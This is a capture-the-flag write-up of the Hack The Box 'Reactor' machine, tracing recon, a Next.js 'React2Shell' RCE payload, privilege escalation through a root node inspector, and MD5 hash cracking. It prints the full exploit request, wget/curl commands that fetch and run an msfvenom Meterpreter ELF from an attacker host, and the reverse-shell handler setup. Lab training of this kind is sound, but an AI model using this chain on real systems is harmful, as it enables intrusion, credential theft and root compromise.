<h1>Hack The Box - Reactor - Easy</h1>
<p>Reactor is an easy-level machine from HackTheBox. It is running a node.js application with a React framework.</p>

<h2>Machine Info</h2>
Name: Reactor
OS: Linux 6.8.0-117-generic
IP: 10.129.8.133

<h2>Reconnaisance and Scanning</h2>
First things first, we want to enumerate the machine. 

```
nmap -T4 -p- 10.129.8.133
```
We see that ports 22 and 3000 are open. We already know 22 is SSH so let's check out 3000.

```
nmap -T4 -p3000 10.129.8.133 -A -sV
```
We get the following

```

PORT     STATE SERVICE VERSION
3000/tcp open  ppp? (fingerprint shows HTTP using NodeJS)
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
|     x-nextjs-cache: HIT
|     x-nextjs-prerender: 1
|     x-nextjs-stale-time: 4294967294
|     X-Powered-By: Next.js
|     Cache-Control: s-maxage=31536000, 
|     ETag: "p02u6gnhufd8t"
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 17175
|     Date: Tue, 02 Jun 2026 18:14:46 GMT
|     Connection: close

```

Looks like we can reach this with http so we open up Firefox and go to 10.129.8.133:3000. 

This seems to be a dashboard monitoring a nuclear reactor. There doesn't seem to be any way to interact with the server so let's run a nikto scan and a dirbuster with a redirect flag.

```
nikto -h 10.129.8.133
```

```
gobuster dir -u http://10.129.8.133 -w /usr/share/wordlists/dirb.big.txt -r
```

Nikto shows a vulnerability with MyWebServer regarding potential buffer overflow and HTML injection. We try the exploit suggested but nothing happens. 

We run a ZAP scan on the host. Scan discovers an RCE vulnerability tied to React called "React2Shell". 

After some research we come across this exploit:

```
POST / HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Next-Action: x
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Length: 459

------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="0"

{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"process.mainModule.require('child_process').execSync('xcalc');","_formData":{"get":"$1:constructor:constructor"}}}
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="1"

"$@0"
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
```

<h2>Gaining Access/Exploitation</h2>

```
python3 -m http.server 80
```

Let's test this exploit. We edit the request above by changing the Host to our IP and 'xcalc' to 'curl http://10.10.14.9'. We start a python web server and send the request. We get a request from the host on our web server. This exploit works.

We then create a meterpreter reverse shell using msfvenom and save it in the same directory as our web server root.

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.9 LPORT=1313 -f elf > shell.elf
```

We send the request above using Burp and edit the command to "wget http://10.10.14.9/shell.elf -O /tmp/shell.elf". We see the request made in our python webserver. 

We start a listener in Meterpreter, then we send two requests, one adding execution to the file, and the other executing it. Our Meterpreter reverse-shell is active. 

```
msfconsole
use multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set LHOST 10.10.14.9
set LPORT 1313
run
```

We are in the root directory of the site. We see reactor.db and download it. Using sqlite3, we find the users table has hashes for administrator and engineer. We grab those and run john against them. 

```
download reactor.db
sqlite3 reactor.db
.tables
SELECT * FROM users;
```

```
john hashes --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5
```


John gives us the password for engineer: reactor1. 

We can now ssh into the host and grab the user flag.

Looking into running processes using ps -aux shows us that root is running node on inspector mode out of port 9229. 

```
root        1379  0.0  1.3 1068608 51500 ?       Ssl  Jun02   0:05 /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```


We find that you can connect to the node process using node inspect localhost:9229 on the victim host. 

Since we are in ssh, we can close our Meterpreter session and start a new one, no changes needed. 

We then execute the following:

```
debug> exec("process.mainModule.require('child_process').exec('/tmp/shell.elf')")
```

This opens a Meterpreter shell as root. Now we just grab the root flag and sit back. 
